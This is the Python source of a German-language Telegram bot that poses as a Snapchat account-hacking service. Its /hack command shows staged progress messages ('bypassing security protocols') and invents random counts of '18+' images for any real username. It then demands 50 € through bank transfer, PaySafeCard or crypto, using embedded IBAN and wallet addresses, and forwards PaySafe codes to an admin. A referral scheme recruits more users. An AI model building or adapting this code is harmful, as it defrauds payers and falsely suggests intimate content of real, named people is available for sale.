from flask import Flask
from threading import Thread
import os
from dotenv import load_dotenv

load_dotenv()  # Lädt die Variablen aus .env

TOKEN = os.getenv("TOKEN")
CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID"))

app = Flask('')

@app.route('/')
def home():
    return "I'm alive"

def keep_alive():
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()

import nest_asyncio
nest_asyncio.apply()

import random
import asyncio
import re
import requests
from bs4 import BeautifulSoup

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.constants import ParseMode

user_paysafe_sent = set()

def check_snapchat_username_exists_and_get_name(username: str):
    url = f"https://www.snapchat.com/@{username}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            if "Sorry, this account doesn’t exist." in resp.text or "Not Found" in resp.text:
                return False, None
            
            soup = BeautifulSoup(resp.text, "html.parser")
            title = soup.find("title")
            if title:
                text = title.text.strip()
                name = text.split("(")[0].strip()
                return True, name
            else:
                return True, username
        else:
            return False, None
    except Exception as e:
        print("Fehler beim Abruf von Snapchat:", e)
        return False, None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🌟 Bitte Join zuerst den Kanal, um den Bot zu Nutzen ! 🌟\n\n"
        "👉 https://t.me/+xSnJBwXX-g05Yjcy\n\n"
        "📢 Nach dem Beitritt kannst du sofort starten:\n"
        "/hack Benutzername\n\n"
        "Schicke Beweise für Zahlungen (Bank & Crypto als Foto, Paysafe als Code) direkt hier im Chat."
    )
    await update.message.reply_text(text)

async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await update.message.reply_text(
                "🌟 Bitte abonniere zuerst den Kanal, um den Bot nutzen zu können! 🌟\n\n"
                "👉 https://t.me/+xSnJBwXX-g05Yjcy"
            )
            return
    except Exception as e:
        print("Fehler bei get_chat_member:", e)
        await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
        return

    if not context.args:
        await update.message.reply_text("Bitte gib den Snapchat-Benutzernamen ein, z.B. /hack Lina.123")
        return

    username = context.args[0]

    exists, name = check_snapchat_username_exists_and_get_name(username)
    if not exists:
        await update.message.reply_text(f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.", parse_mode=ParseMode.MARKDOWN)
        return

    msg = await update.message.reply_text("🚀 Starte den Vorgang...")
    await asyncio.sleep(2)
    await msg.edit_text("🔍 Suche nach Nutzerdaten...")
    await asyncio.sleep(3)
    await msg.edit_text("⚙️ Umgehe Sicherheitsprotokolle...")
    await asyncio.sleep(2)
    await msg.edit_text("📡 Greife auf private Dateien zu...")
    await asyncio.sleep(2)

    bilder = random.randint(16, 20)
    videos = random.randint(7, 8)

    msg_text = (
        f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
        f"👤 {name}\n"
        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
        f"📹 {videos} Videos als 18+ getaggt\n\n"
        f"📧 Email: Du hast nicht genügend Credits für diese Information.\n"
        f"🔑 Passwort: Du hast nicht genügend Credits für diese Information.\n"
        f"🔒 My Eyes Only Code: Du hast nicht genügend Credits für diese Information.\n\n"
        f"💶 Um sofort Zugriff auf das Konto und den Mega.io Ordner zu erhalten, tätige bitte eine Zahlung von 50 € mit /pay.\n\n"
        f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst."
    )
    await msg.edit_text(msg_text)

async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
        [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
        [InlineKeyboardButton("🪙 Kryptowährungen", callback_data="pay_crypto")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cmd = query.data

    if cmd == "pay_bank":
        text = (
            "🏦 <b>Banküberweisung</b>\n\n"
            "Empfänger: Euro Hunter\n"
            "IBAN: <code>IE50 PPSE 9903 8024 4830 33</code>\n"
            "BIC: <code>PPSEIE22XXX</code>\n\n"
            "Bitte sende hier ein Foto deines Zahlungsbelegs.\n"
            "Wichtig: Gib im Verwendungszweck deinen Telegram-Benutzernamen an."
        )
        keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

    elif cmd == "pay_paysafe":
        text = (
            "💳 <b>PaySafeCard</b>\n\n"
            "Bitte sende deinen 16-stelligen PaySafe-Code im Format:\n"
            "<code>0000-0000-0000-0000</code>\n\n"
            "Der Code wird überprüft und weitergeleitet.\n"
            "Bitte warte nach dem Senden auf die Bestätigung."
        )
        keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

    elif cmd == "pay_crypto":
        text = (
            "🪙 <b>Kryptowährungen</b>\n\n"
            "- ETH (Ethereum): <code>0xb213CaF608B8760F0fF3ea45923271c35EeA68F5</code>\n"
            "- BTC (Bitcoin): <code>bc1q72jdez5v3m7dvtlpq8lyw6u8zpql6al6flwwyr</code>\n"
            "- LTC (Litecoin): <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n\n"
            "Bitte sende hier ein Foto deines Zahlungsbelegs."
        )
        keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

    elif cmd == "pay":
        keyboard = [
            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
            [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
            [InlineKeyboardButton("🪙 Kryptowährungen", callback_data="pay_crypto")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)

async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🎁 <b>Lade Freunde ein und erhalte einen kostenlosen Hack!</b>\n\n"
        "Du bekommst <b>einen Hack gratis</b>, wenn du <b>10 neue Personen</b> über deinen Link einlädst:\n\n"
        "🔗https://t.me/+xSnJBwXX-g05Yjcy\n\n"
        "Wenn jemand über deinen Link den Bot benutzt, zählt es als gültige Einladung."
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo = update.message.photo[-1]
    caption = update.message.caption or ""
    from_user = update.message.from_user

    forward_text = (
        f"📸 Neuer Beweis von @{from_user.username or from_user.first_name} (ID: {from_user.id})\n\n"
        f"Bildunterschrift:\n{caption}"
    )

    try:
        await context.bot.send_photo(
            chat_id=ADMIN_CHAT_ID,
            photo=photo.file_id,
            caption=forward_text,
            parse_mode=ParseMode.HTML,
        )
        await update.message.reply_text("✅ Beweisfoto wurde erfolgreich gesendet!\nBitte warte 5 Minuten auf die Bearbeitung.")
    except Exception as e:
        print("Fehler beim Senden des Beweisfotos:", e)
        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos. Bitte versuche es später erneut.")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")

    if paysafe_pattern.match(text):
        from_user = update.message.from_user
        if from_user.id in user_paysafe_sent:
            await update.message.reply_text("Du hast bereits einen Paysafe-Code gesendet. Warte bitte auf die Bearbeitung.")
            return
        user_paysafe_sent.add(from_user.id)

        msg_to_admin = (
            f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name} (ID: {from_user.id}):\n"
            f"<code>{text}</code>"
        )
        try:
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg_to_admin, parse_mode=ParseMode.HTML)
            await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!\nBitte warte 5 Minuten auf die Bearbeitung.")
        except Exception as e:
            print("Fehler beim Senden des Paysafe-Codes:", e)
            await update.message.reply_text("❌ Fehler beim Senden deines Paysafe-Codes. Bitte versuche es später.")
        return

    await update.message.reply_text("Bitte benutze die vorgegebenen Befehle oder sende ein gültiges Beweisfoto.")

def main():
    keep_alive()

    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hack", hack))
    application.add_handler(CommandHandler("pay", pay))
    application.add_handler(CommandHandler("invite", invite))
    application.add_handler(CommandHandler("redeem", redeem))

    application.add_handler(CallbackQueryHandler(button_handler))

    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot läuft...")
    application.run_polling()

if __name__ == "__main__":
    main()
